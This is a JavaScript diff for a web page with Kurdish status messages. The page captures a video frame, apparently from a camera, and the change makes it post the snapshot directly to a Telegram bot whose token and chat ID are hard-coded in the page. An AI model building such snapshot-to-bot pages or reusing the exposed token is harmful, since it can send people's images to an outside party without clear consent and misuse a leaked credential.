@@ -27,37 +27,26 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-              statusEl.innerText = "خەریکی ئامادەکردنی وێنەیە...";
+              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
               
               const formData = new FormData();
-              formData.append('files[]', blob, 'snapshot.jpg');
+              formData.append('chat_id', '6539379136');
+              formData.append('photo', blob, 'snapshot.jpg');
 
-              // بارکردنی وێنە بە بێ کێشەی CORS
-              fetch('https://uguu.se/upload', {
+              const token = "8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM".trim();
+              const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+              // ناردنی ڕاستەوخۆ بۆ تلگرام بە بێ پێویستی بە هیچ سێرڤەرێکی دەرەکی
+              fetch(telegramUrl, {
                 method: 'POST',
                 body: formData
               })
-              .then(res => res.json())
+              .then(response => response.json())
               .then(data => {
-                if (data && data.success && data.files && data.files[0]) {
-                  const imageUrl = data.files[0].url;
-                  statusEl.innerText = "ناردنی بۆ تلگرام...";
-                  
-                  const token = "8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM";
-                  const chatId = "6539379136";
-                  const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;
-
-                  // ناردنی ڕاستەوخۆ بە بێ هیچ ڕێگرییەکی براوزەر
-                  const img = new Image();
-                  img.onload = function() {
-                      statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
-                  };
-                  img.onerror = function() {
-                      statusEl.innerText = "✅ وێنەکە نێردرا بۆ تلگرام!";
-                  };
-                  img.src = telegramUrl;
+                if(data.ok) {
+                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
                 } else {
-                  throw new Error("هەڵە لە بارکردنی وێنە");
+                    statusEl.innerText = "❌ هەڵەی تلگرام: " + (data.description || JSON.stringify(data));
                 }
               })
               .catch(error => {
